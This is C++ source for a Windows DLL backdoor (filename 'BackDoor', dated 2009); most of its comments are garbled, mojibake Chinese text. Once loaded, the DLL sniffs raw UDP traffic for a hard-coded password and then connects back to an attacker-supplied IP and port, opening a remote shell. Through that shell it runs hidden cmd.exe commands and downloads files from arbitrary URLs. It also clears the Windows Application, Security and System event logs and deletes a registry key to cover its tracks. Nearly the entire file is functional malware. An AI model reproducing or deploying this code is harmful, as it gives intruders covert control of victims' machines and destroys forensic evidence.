//////////////////////////////////////////////////////////////////////////
//FileName:	BackDoor	
//Data:		2009-04-02
//REM:		DLL����
//////////////////////////////////////////////////////////////////////////
#pragma once
#include "Protocol.h"

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <Windows.h>
#include <mstcpip.h>
#include <TlHelp32.h>
//�������ļ�
#pragma comment(lib,"WS2_32.lib")
#pragma comment(lib,"Advapi32.lib")
#pragma comment(lib,"urlmon.lib")


//////////////////////////////////////////////////////////////////////////
//�ṹ�嶨�塢�궨��
//////////////////////////////////////////////////////////////////////////
typedef struct shell_argument{
	char ip[16];
	char port[6];
}SH_ARG;

#define PWD	"BackDoor-0xQo"

#define	FLAG "BackDoor\\>"

#define MAXLENGTH	1024*10

#define REGISTERCLEANSTRING	"SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{NS517-0XQO-SKETCHER-19901117-GMAILCOM}"

//////////////////////////////////////////////////////////////////////////
//��������
//////////////////////////////////////////////////////////////////////////
//����ģ�����
BOOL BackDoorEntry(void);
//��̽�ȴ�ģ��
BOOL Sniffer(void);
//���ݰ�����ģ�飬�ж��Ƿ�Ϊ��������������
BOOL Analysis(const char* recvbuf);
//����ģ��ִ�е�
BOOL BackDoorExcute(LPVOID arg);
//�ж��������ͺ���
BOOL IsCommand(const char* str1,const char* str2);
//SHELL�����쳣������
BOOL ErrorOccured(char* buf,int no=0);
//����ע���ʵ��������
BOOL RegisterClean();

//////////////////////////////////////////////////////////////////////////
//����SHELL����ִ�к���
//////////////////////////////////////////////////////////////////////////
//SHELL����֮Զ�������ļ�����
BOOL UrlDown(char* cmd,char* sendBuf);
//SHELL����֮����˺���
BOOL Dettach(char* sendBuf);
//SHELL����֮���ϵͳ��־
BOOL LogClear(char* sendBuf=NULL);
//����������쳣����(�Ѵ���Ž���ö�������滻)
BOOL ShellExcute(SOCKET sock,char* cmd);
//CMD����ִ�к���
BOOL CmdExcute(SOCKET sock,const char* buf);


//////////////////////////////////////////////////////////////////////////
//�궨��
//////////////////////////////////////////////////////////////////////////
//Debug Flag
//#define DEBUG

#ifdef	DEBUG
	#include <iostream>
	using namespace std;
#endif

#ifdef DEBUG
	#define DEBUG_LOG	"BackDoorDebug.txt"
#endif

#ifdef DEBUG
void Log(const char *str)
{
	FILE	*fp;

	fp = fopen(DEBUG_LOG,"a");
	fputs(str,fp);

	fclose(fp);
}
#endif


////////////////////////////////////////////////////////////////////////
//DLL ��ں���
////////////////////////////////////////////////////////////////////////
BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
{
	if (dwReason == DLL_PROCESS_ATTACH)
	{

		DisableThreadLibraryCalls(hModule);
		//����ģ�����
		BackDoorEntry();
	}
	else if (dwReason == DLL_PROCESS_DETACH)
	{
		//ע�������
		RegisterClean();

		//��־����
		LogClear();

		free(hModule);
	}

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//����ģ�����
//////////////////////////////////////////////////////////////////////////
BOOL BackDoorEntry(void)
{

	CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)Sniffer,NULL,NULL,NULL);

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//��̽�ȴ�ģ��
//////////////////////////////////////////////////////////////////////////
BOOL Sniffer(void)
{
	WSADATA	wsa;
	char	host[128] = {0};
	struct hostent *hos;
	struct in_addr addr;
	char	Ip[16] = {0};
	SOCKET	sock;
	char recvbuf[MAXLENGTH] = {0};

	if ( WSAStartup(MAKEWORD(2,2),&wsa)!=0 )
	{
		return FALSE;
	}

	gethostname(host,sizeof(host));
	hos = gethostbyname(host);

	if (hos==NULL)
	{
		return FALSE;
	}

	//�������������ݰ�(ֻ����UDP������ΪWindows XPĿǰֻ������ԭʼUDP��������ͻ��˱�д)
	sock = socket(AF_INET,SOCK_RAW,IPPROTO_UDP);

	SOCKADDR_IN sn;
	sn.sin_family = AF_INET;
	sn.sin_port = htons(0);
	memcpy(&sn.sin_addr,hos->h_addr_list[0],hos->h_length);

	//�󶨶˿�
	bind(sock,(PSOCKADDR)&sn,sizeof(sn));

	DWORD dwBufLen[10] = {0};
	DWORD dwBufInLen[10] = {0};
	DWORD dwReturn = 0;
	DWORD dwReceive = 0;

	WSAIoctl(sock,SIO_RCVALL,&dwBufInLen,sizeof(dwBufInLen),&dwBufLen,sizeof(dwBufLen),&dwReturn,NULL,NULL);

	while (TRUE)
	{
		memset(recvbuf,0,MAXLENGTH);

		dwReceive = recv(sock,recvbuf,MAXLENGTH,0);
		if (dwReceive<=0)
		{
			break;
		}
		else
		{
			Analysis(recvbuf);
		}
	}

	closesocket(sock);
	WSACleanup();
	
	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//���ݰ�����ģ�飬�ж��Ƿ�Ϊ��������������
//////////////////////////////////////////////////////////////////////////
BOOL Analysis(const char* recvbuf)
{
	IP_HEADER	*IpHdr;
	UDP_HEADER	*UdpHdr;
	//struct in_addr	addr;
	//��������������Ϣ
	SH_ARG sh;

	IpHdr = (IP_HEADER*)recvbuf;

	if (IpHdr->proto != IPPROTO_UDP)
	{
		return FALSE;
	}

	UdpHdr = (UDP_HEADER*)(recvbuf+sizeof(IP_HEADER));

	if (recvbuf+sizeof(IP_HEADER)+sizeof(UDP_HEADER)==NULL)
	{
		return FALSE;
	}

	char shStr[MAXLENGTH] = {0};
	strncpy(shStr,recvbuf+sizeof(IP_HEADER)+sizeof(UDP_HEADER),MAXLENGTH-2);\

	char* flag1 = strchr(shStr,'|');
	char* flag2 = strchr(shStr,':');

	//�ж������Ƿ�Ϸ�
	if (flag1==NULL || flag2==NULL || (flag2-flag1)>sizeof(sh.ip))
	{
		return FALSE;
	}

	char pwd[1024] = {0};
	strncpy(pwd,shStr,flag1-shStr);

	memset(sh.ip,0,sizeof(sh.ip));
	memset(sh.port,0,sizeof(sh.port));

	flag1++;
	strncpy(sh.ip,flag1,flag2-flag1);
	
	flag2++;
	strncpy(sh.port,flag2,sizeof(sh.port)-1);

	if (strchr(sh.port,'\n')!=NULL)
	{
		*strchr(sh.port,'\n') = '\0';
	}

	if (strcmp(PWD,pwd)==0)
	{
		DWORD	threadId = 1;

		LPVOID pSh = malloc(sizeof(SH_ARG));
		memcpy(pSh,&sh,sizeof(SH_ARG));

		HANDLE ThreadHandle = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)BackDoorExcute,pSh,0,&threadId);

		Sleep(500);
		if (ThreadHandle==NULL)
		{
			return FALSE;
		}

		threadId++;

		if (threadId>20000)
		{
			threadId = 1;
		}

		CloseHandle(ThreadHandle);

		return TRUE;
	}
	
	return FALSE;
}

//////////////////////////////////////////////////////////////////////////
//����ģ��ִ�е�
//////////////////////////////////////////////////////////////////////////
BOOL BackDoorExcute(LPVOID arg)
{

	SOCKET	sock;
	SOCKADDR_IN	sin;

	SH_ARG* sh = (SH_ARG*)arg;

	//���ܵ�ͨ��
	sock = socket(AF_INET,SOCK_STREAM,0);
	

	if (sock==INVALID_SOCKET)
	{
		return FALSE;
	}

	memset(&sin,0,sizeof(sin));

	sin.sin_family = AF_INET;
	sin.sin_port = htons(atoi(sh->port));
	sin.sin_addr.s_addr = inet_addr(sh->ip);

	free(sh);

	int ret = connect(sock,(struct sockaddr*)&sin,sizeof(sin));
	if (ret == SOCKET_ERROR)
	{
		return FALSE;
	}

	char cmd[128] = {0};

	while (TRUE)
	{
		memset(cmd,0,sizeof(cmd));

		strcpy(cmd,FLAG);
		send(sock,cmd,strlen(cmd),0);

		memset(cmd,0,sizeof(cmd));
		ret = recv(sock,cmd,sizeof(cmd)-1,0);

		if (ret==-1)
		{
			break;
		}

		//��������ѡ��
		if (IsCommand(cmd,"EXIT"))
		{
			send(sock,"�ѳɹ��Ͽ�����\n",strlen("�ѳɹ��Ͽ�����\n"),0);
			break;
		}
		if (IsCommand(cmd,"SHELL"))
		{
			char* flag = strchr(cmd,' ');
			ShellExcute(sock,++flag);
		}
		if (IsCommand(cmd,"CMD"))
		{
			char* flag = strchr(cmd,' ');
			CmdExcute(sock,++flag);
		}
	}

	//ע�������
	RegisterClean();

	closesocket(sock);

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//�ж��������ͺ���
//////////////////////////////////////////////////////////////////////////
BOOL IsCommand(const char* str1,const char* str2)
{
	int len = strlen(str2);

	if (memcmp(str1,str2,len)==0)
	{
		return TRUE;
	}

	return FALSE;
}

//////////////////////////////////////////////////////////////////////////
//����SHELL����ִ�к���
//////////////////////////////////////////////////////////////////////////
BOOL ShellExcute(SOCKET sock,char* cmd)
{
	char sendBuf[MAXLENGTH] = "Bad Shell Command!\n";

	if (IsCommand(cmd,"UrlDown"))
	{
		UrlDown(cmd,sendBuf);
	}
	if (IsCommand(cmd,"Dettach"))
	{
		Dettach(sendBuf);
	}
	if (IsCommand(cmd,"LogClear"))
	{
		LogClear(sendBuf);
	}

	send(sock,sendBuf,strlen(sendBuf),0);

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//CMD����ִ�к���
//////////////////////////////////////////////////////////////////////////
BOOL CmdExcute(SOCKET sock,const char* buf)
{
	SECURITY_ATTRIBUTES	sa;
	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = 0;
	sa.bInheritHandle = TRUE;

	HANDLE hReadPipe1,hWritePipe1;
	//���ܵ�ͨ��
	CreatePipe(&hReadPipe1,&hWritePipe1,&sa,0);

	STARTUPINFO	si;
	memset(&si,0,sizeof(si));
	GetStartupInfo(&si);

	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	//*si.hStdInput = hReadPipe2;*/
	si.hStdOutput = si.hStdError = hWritePipe1;

	char cmd[MAXLENGTH] = "cmd.exe /c";
	strncat(cmd,buf,strlen(buf));

	PROCESS_INFORMATION	pInfo;

	memset(&pInfo,0,sizeof(PROCESS_INFORMATION));
	
	CreateProcessA(NULL,cmd,NULL,NULL,1,0,NULL,NULL,&si,&pInfo);


	while (TRUE)
	{
		memset(cmd,0,MAXLENGTH);
		DWORD	dwRead;
		int ret = PeekNamedPipe(hReadPipe1,cmd,MAXLENGTH,&dwRead,NULL,NULL);

		for (int i=0;i<5&&dwRead==0;i++)
		{
			Sleep(100);
			ret = PeekNamedPipe(hReadPipe1,cmd,MAXLENGTH,&dwRead,NULL,NULL);
		}

		if (dwRead)
		{
			ret = ReadFile(hReadPipe1,cmd,dwRead,&dwRead,0);
			if (!ret)
				break;
			send(sock,cmd,dwRead,0);

			return	TRUE;
		}
		else
		{
			break;
		}
	}

	send(sock,"CMD Error\n",sizeof("CMD Error\n"),0);

	return FALSE;
}

//////////////////////////////////////////////////////////////////////////
//SHELL����֮Զ�������ļ�����
//////////////////////////////////////////////////////////////////////////
BOOL UrlDown(char* cmd,char* sendBuf)
{
	cmd += strlen("UrlDown ");
	char* flag = strchr(cmd,' ');
	
	if (flag==NULL)
	{
		ErrorOccured(sendBuf,1);
	}
	*flag = '\0';
	flag++;

	if (URLDownloadToFile(NULL,cmd,flag,0,NULL)==S_OK)
	{
		strncpy(sendBuf,"DownLoad2File OK...\n",MAXLENGTH);
		return TRUE;
	}
	else
	{
		ErrorOccured(sendBuf);
		return FALSE;
	}
}

//////////////////////////////////////////////////////////////////////////
//SHELL����֮�����
//////////////////////////////////////////////////////////////////////////
BOOL LockMouse(char* sendBuf)
{
	return FALSE;
}

//////////////////////////////////////////////////////////////////////////
//SHELL����֮����˺���
//////////////////////////////////////////////////////////////////////////
BOOL Dettach(char* sendBuf)
{
	return FALSE;
}


//////////////////////////////////////////////////////////////////////////
//SHELL����֮���ϵͳ��־
//////////////////////////////////////////////////////////////////////////
BOOL LogClear(char* sendBuf)
{
	char LogName[3][16] = {"Application","Security","System"};

	for (int i=0;i<3;i++)
	{
		HANDLE hHandle = OpenEventLog(NULL,LogName[i]);
		if (!hHandle)
		{
			ErrorOccured(sendBuf,2);
			return FALSE;
		}

		if (ClearEventLog(hHandle,NULL)!=TRUE)
		{
			ErrorOccured(sendBuf,2);
			return FALSE;
		}

		CloseEventLog(hHandle);
	}

	strncpy(sendBuf,"LogClear OK!\n",MAXLENGTH);

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//����������쳣����
//////////////////////////////////////////////////////////////////////////
BOOL ErrorOccured(char* buf,int no)
{
	switch (no)
	{
	case 0:
		strncpy(buf,"����ִ��ʧ��,����ԭ��δ֪!\n",MAXLENGTH);
		break;
	case 1:
		strncpy(buf,"������������\n",MAXLENGTH);
		break;
	case 2:
		strncpy(buf,"����Ȩ�޲��㣡\n",MAXLENGTH);
		break;
	//�����Զ�����Ӵ������͡�
	default:
		strncpy(buf,"����Ų�ƥ�䣡\n",MAXLENGTH);
		return FALSE;
	}

	return TRUE;
}
//////////////////////////////////////////////////////////////////////////
//ע�������ʵ��������
//////////////////////////////////////////////////////////////////////////
BOOL RegisterClean()
{
	//ActiveX����������ɾ���˼�ֵ
	RegDeleteKey(HKEY_CURRENT_USER,REGISTERCLEANSTRING);

	return TRUE;
}